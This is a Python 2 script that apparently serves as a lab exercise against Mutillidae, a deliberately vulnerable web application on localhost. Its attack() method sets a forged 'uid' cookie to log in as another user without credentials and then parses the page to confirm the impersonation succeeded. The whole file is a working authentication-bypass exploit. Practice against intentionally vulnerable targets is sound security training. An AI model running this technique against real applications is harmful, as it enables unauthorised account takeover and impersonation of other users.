from bs4 import BeautifulSoup as BSoup
import re
import mechanize
import argparse
import sys

class AddLoginCookies():
	url = "http://127.0.0.1/mutillidae/"
	
	def __init__(self,uid):
		
		self.uid = uid
		
		self.br = mechanize.Browser(factory=mechanize.DefaultFactory(i_want_broken_xhtml_support=True))
        	self.br.set_handle_robots(False)
        	self.br.set_handle_refresh(False)
        	self.br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
		self.br.set_proxies({"http":"127.0.0.1:3128"})

	def close(self):
		self.br.close()

	def attack(self):
		
		if self.br == None:
			return

		_url = AddLoginCookies.url

	#	try:
		print " ### Opening %s ###\n"%_url
		self.br.open(_url)
		self.br.set_cookie("uid="+str(self.uid))

		self.br.reload()

		bs = BSoup(self.br.response().read(),'lxml')
		
		spanText = bs.find('span', {'id': 'idSystemInformationHeading'}).getText()

		if re.search(r'Logged In',spanText):
			a=re.search(r'Logged In ',spanText)	
			print "### Successful Login as %s ###"%spanText[a.end():a.end()+15]

		else:
			print "### Attack wasn't successful ###"

	#	except Exception, e:
	#		print " !!!Atack wasn't successful due to error:",e

	

def main():

	parser = argparse.ArgumentParser()
	parser.add_argument('-u',dest='uid')
	args = parser.parse_args()
	
	if int(args.uid)<1 or int(args.uid)>9:
		print "UID muss 10>UID>0 sein"
		sys.exit(0)

	attacker = AddLoginCookies(args.uid)
	attacker.attack()
	attacker.close()
	

if __name__ == "__main__":
	main()	
